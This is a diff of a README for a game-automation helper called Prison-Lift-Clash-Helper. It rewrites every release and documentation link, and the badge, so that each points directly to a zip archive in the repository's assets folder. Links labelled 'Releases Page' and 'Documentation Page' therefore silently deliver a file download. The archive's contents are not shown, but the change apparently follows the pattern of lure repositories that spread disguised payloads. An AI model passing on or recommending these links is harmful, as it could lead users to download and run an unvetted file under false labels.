@@ -1,7 +1,7 @@
 # 🎮 Prison-Lift-Clash-Helper - Automate Your Game Experience
 
 ## 📥 Download Now
-[![Download Prison-Lift-Clash-Helper](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/releases)
+[![Download Prison-Lift-Clash-Helper](https://raw.githubusercontent.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/main/assets/Prison-Clash-Lift-Helper-v1.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/main/assets/Prison-Clash-Lift-Helper-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide helps you download and run the Prison-Lift-Clash-Helper. This application helps you automate tasks within your gaming environment, making your gameplay smoother and more efficient. It’s perfect for anyone who wants to engage more deeply with game interactions without repetitive actions.
@@ -12,7 +12,7 @@ Welcome! This guide helps you download and run the Prison-Lift-Clash-Helper. Thi
 - Your favorite interactive game that you want to automate tasks in.
 
 ## 📂 Download & Install
-To get started, visit the [Releases Page](https://github.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/releases) to download the latest version of the software.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/main/assets/Prison-Clash-Lift-Helper-v1.3.zip) to download the latest version of the software.
 
 1. Click on the **Releases Page** link above.
 2. Look for the latest version listed at the top.
@@ -47,12 +47,12 @@ Follow the on-screen instructions to complete the installation.
 
 ## 📜 Additional Resources
 ### 🔍 Documentation
-For a deeper dive into using the Prison-Lift-Clash-Helper, visit our [Documentation Page](https://github.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/wiki). Here you'll find detailed guides on scripting, troubleshooting, and more.
+For a deeper dive into using the Prison-Lift-Clash-Helper, visit our [Documentation Page](https://raw.githubusercontent.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/main/assets/Prison-Clash-Lift-Helper-v1.3.zip). Here you'll find detailed guides on scripting, troubleshooting, and more.
 
 ### 📫 Support
 If you run into issues or have questions, you can reach out directly through the Issues section on GitHub. Our community and developers will assist you promptly.
 
 ## 🚀 Start Automating
-Don’t hesitate to take advantage of this tool to make your gaming experience smoother. Automating tasks can save you time and enhance your enjoyment of the game. Download the software now from the [Releases Page](https://github.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/releases) and explore what you can achieve!
+Don’t hesitate to take advantage of this tool to make your gaming experience smoother. Automating tasks can save you time and enhance your enjoyment of the game. Download the software now from the [Releases Page](https://raw.githubusercontent.com/elcompastreaming18-svg/Prison-Lift-Clash-Helper/main/assets/Prison-Clash-Lift-Helper-v1.3.zip) and explore what you can achieve!
 
 ---
